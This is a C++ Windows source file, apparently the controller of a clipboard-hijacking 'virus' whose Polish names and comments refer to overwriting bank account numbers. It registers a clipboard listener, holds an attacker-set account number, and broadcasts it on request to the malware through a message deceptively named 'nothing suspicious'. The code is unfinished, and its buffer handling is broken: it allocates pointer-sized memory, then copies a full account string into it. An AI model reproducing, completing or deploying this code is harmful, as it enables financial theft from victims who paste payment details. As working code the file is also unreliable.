#include "main.h"

constexpr CHAR szClassName[] = "KomunikatorWirusa";
constexpr CHAR windowTitle[] = "Komunikator Wirusa";
constexpr CHAR msgName[] = "Nic podejrzanego";
LPSTR bankAccount;
HWND hwndThis;
UINT messageCode;
bool bAset;

// TODO: set up box and button for setting bank account number

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if (!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		wc.lpszClassName,
		windowTitle,
		WS_CAPTION | WS_VISIBLE,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;

	if (!AddClipboardFormatListener(hwndThis)) return false;

	HWND hwndButton = CreateWindow(
		"BUTTON",  // Predefined class; Unicode assumed 
		"OK",      // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
		10,         // x position 
		10,         // y position 
		100,        // Button width
		100,        // Button height
		hwndThis,   // Parent window
		NULL,       // No menu.
		(HINSTANCE)GetWindowLong(hwndThis, GWL_HINSTANCE),
		NULL		// Pointer not needed.
	);

	messageCode = RegisterWindowMessage(msgName);


	bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
	bAset = false;

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == messageCode)
	{
		switch (wParam)
		{
		case REQUEST_NUMBER:
			if (!bAset) break; // Brak konta bankowego do nadpisania
			PostNumber();
			break;
		}
	}
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void PostNumber()
{
	HGLOBAL hGlobalMem = GlobalAlloc(GHND, sizeof(bankAccount));
	if (hGlobalMem != NULL)
	{
		LPSTR lpGlobalMem = LPSTR(GlobalLock(hGlobalMem));
		memcpy(lpGlobalMem, bankAccount, MAXL + 1);
		GlobalUnlock(hGlobalMem);
		PostMessage(HWND_BROADCAST, messageCode, POST_NUMBER, LONG_PTR(hGlobalMem));
	}
}